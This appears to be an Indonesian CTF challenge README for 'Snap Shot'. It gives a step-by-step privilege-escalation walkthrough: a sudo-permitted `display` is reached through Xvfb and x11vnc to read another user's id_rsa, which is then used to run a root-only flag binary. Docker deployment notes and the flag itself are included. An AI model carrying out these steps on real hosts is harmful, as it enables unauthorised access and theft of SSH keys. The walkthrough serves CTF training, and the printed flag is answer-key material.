## Judul Soal
Snap Shot

## Deskripsi Soal

> I was told by someone that he bought me a gift. Unfortunately, I need to have a proper access to grab it <br><br>`nc ip port`<br><br>Note: The service used Paramiko SSH module instead of traditional SSH prompt

---
## Proof of Concept

- Log in using CTFd account to get access to remote server
- By checking user privileges, we found that we can execute `display` as `joints` user
    ```sh
    $ sudo -l
    User user may run the following commands on 76a6f93ed1a9:
        (joints) NOPASSWD: /usr/bin/display
    ```
- Since there're no X11 Display, we need to create ones. Note, since it's using `paramiko` the `&` character may not work as expected. Fortunately, the command still executed
    ```sh
    $ Xvfb :4000 -listen tcp -ac -screen 0 512x512x24 &
    ```
- Since `display` only accept image binary, we need to download an image to the server
    ```sh
    $ wget -O test.png https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png
    ```
- Execute `display` on `test.png` using `:4000` as virtual X11 display & `joints` user. These step can also be replaced by using an external remote display from a Public IP
    ```sh
    $ DISPLAY=:4000 sudo -u joints display test.png &
    ```
- Forward X11 display as VNC traffic
    ```sh
    $ x11vnc -display :4000 -bg -forever -nopw -quiet -listen localhost -xkb
    ```
- Then, simply forward VNC traffic to Public IP using `ngrok` or `SSH Forward`
- Connect to VNC remote server & using `File` prompt, go to `/home/joints/.ash_history` that contains a history of `id_rsa` being downloaded. There's also an `id_rsa` on `/home/joints/.ssh/id_rsa` but it can't be copy-paste-ed
- Download `id_rsa` from the external link & remote ssh as `joints` user from `localhost`. If we check the privileges again we found that `joints` user has privileges to execute `/root/get_flag`
    ```sh
    $ ssh -o "StrictHostKeyChecking no" -p 2222 -i id_rsa joints@localhost sudo -l

    User joints may run the following commands on 76a6f93ed1a9:
        (root) NOPASSWD: /root/get_flag
    ```
- Finally, just execute `/root/get_flag` using `joints` user
    ```sh
    $ ssh -o "StrictHostKeyChecking no" -p 2222 -i id_rsa joints@localhost sudo /root/get_flag

    JOINTS21{forw4rding_x11_traffics_4re_k1nda_fun_e1683a}
    ```
---

## Catatan deployment

Konfigurasi `docker` ada di directory `server`. Ganti `port` & limit mem-cpu sesuai kebutuhan.

Note, service nya masih hasil `trial & error`, jadi kemungkinan bisa broken sewaktu2 :'v

```sh
# Build
$ docker-compose build

# Deploy
# Bebas pilih salah satu

# Non-swarm mode
$ docker-compose up -d wrapper
$ docker-compose --compatibility scale snapshot=15

# Swarm mode
$ docker stack deploy -c docker-compose.yml snapshot
$ docker service scale snapshot_snapshot=15 

```

## Service Test

Script test ada di directory `test`. Misal ada node yang `error` bisa `restart service` atau re-`scale` lagi.

```sh
Sending command on test_soal15 -> Work
Sending command on test_soal10 -> Work
Sending command on test_soal3 -> Work
Sending command on test_soal7 -> Work
Sending command on test_soal11 -> Work
Sending command on test_soal2 -> Work
Sending command on test_soal8 -> Work
Sending command on test_soal14 -> Work
Sending command on test_soal13 -> Work
Sending command on test_soal6 -> Work
Sending command on test_soal1 -> Work
Sending command on test_soal9 -> Work
Sending command on test_soal12 -> Work
Sending command on test_soal5 -> Work
Sending command on test_soal4 -> Work
``` 

## Flag
JOINTS21{forw4rding_x11_traffics_4re_k1nda_fun_e1683a}
